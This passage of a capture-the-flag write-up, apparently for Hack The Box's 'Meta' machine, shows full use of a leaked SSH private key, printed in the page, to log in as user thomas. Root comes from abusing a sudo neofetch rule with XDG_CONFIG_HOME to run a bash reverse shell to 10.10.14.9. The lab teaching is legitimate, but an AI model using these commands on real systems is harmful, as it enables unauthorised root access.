M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----

</code></pre></div><p>Now save this file in your attacker machine as <em>priv.key</em> and run these commands,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>chmod <span style=color:#ae81ff>600</span> priv.key <span style=color:#f92672>&amp;&amp;</span> ssh-keygen -p -N <span style=color:#e6db74>&#34;&#34;</span> -m pem -f priv.key
</code></pre></div><p>It will create a new <em>priv.key</em> file in RSA format,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

</code></pre></div><p>Use this key to login as thomas user,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>chmod <span style=color:#ae81ff>600</span> priv.key <span style=color:#f92672>&amp;&amp;</span> ssh thomas@10.10.11.140 -i priv.key
</code></pre></div><p>We logged in successfully,
Let&rsquo;s Grab the user flag as well.</p><p><img src=/assets/Pasted%20image%2020220225001913.png alt="assets/Pasted image 20220225001913.png"></p><p>We have got only User priviledge , to read the Root Flag we need Root Privilege as well.</p><h2 id=getting-root-privilege>Getting Root Privilege</h2><p>We can run the linpeas to find possible privilege escalation vectors, But i ran quick command <code>sudo -l</code> , Which listed all the Binaries/Scripts which were allowed to run as root without credentials requirement.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>thomas@meta:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> thomas on meta:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin,
    env_keep<span style=color:#f92672>+=</span>XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/neofetch <span style=color:#ae81ff>\&#34;</span><span style=color:#ae81ff>\&#34;</span>

</code></pre></div><p>So we are only allowed to run specific command i.e</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>/usr/bin/neofetch <span style=color:#ae81ff>\&#34;</span><span style=color:#ae81ff>\&#34;</span>
</code></pre></div><p>And we can also control a Environmental Varialble <em>XDG_CONFIG_HOME</em></p><p>Gooling around this env variable and neofetch config file location , We can find these blogs for <a href=https://askubuntu.com/questions/853624/neofetch-custom-config-file-what-is-required-config-file-format>neofetch</a> and <em><a href=https://superuser.com/questions/365847/where-should-the-xdg-config-home-variable-be-defined>XDG_CONFIG_HOME</a></em> ,
According to these blog posts, We can figure out that..</p><ul><li><em>/usr/bin/neofetch ""</em> - Command will run the default neofetch configuration. And we can&rsquo;t specify the &ndash;config parameter as doing so will require the root credentials.</li><li>XDG_CONFIG_HOME - This env Variable is used to specify the Configuration Location , Which in our case will be used by Neofetch.</li></ul><p>We also found the neofetch config file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>/home/thomas/.config/neofetch/config.conf
</code></pre></div><p>Now Let&rsquo;s modify the neofetch config.conf file (/home/thomas/.config/neofetch/config.conf) and add a bash reverse shell in the first line.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>/bin/bash -c <span style=color:#e6db74>&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/6666 0&gt;&amp;1&#34;</span>
</code></pre></div><p>Let&rsquo;s Export the base config environmental path,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>export XDG_CONFIG_HOME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$HOME<span style=color:#e6db74>/.config</span><span style=color:#e6db74>&#34;</span>
OR
export XDG_CONFIG_HOME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/home/thomas/.config&#34;</span>
</code></pre></div><p>Run a netcat listener on port 6666</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nc -lnvp 6666
</code></pre></div><p>Now run the command as root to get the reverse shell.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>sudo -u root /usr/bin/neofetch <span style=color:#ae81ff>\&#34;</span><span style=color:#ae81ff>\&#34;</span>
</code></pre></div><p><img src=/assets/Pasted%20image%2020220225004917.png alt="assets/Pasted image 20220225004917.png"></p><p>We got the root access,</p><p>Let&rsquo;s Grab the Root Flag as well.</p><p><img src=/assets/Pasted%20image%2020220225004955.png alt="assets/Pasted image 20220225004955.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with ðŸ’› by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>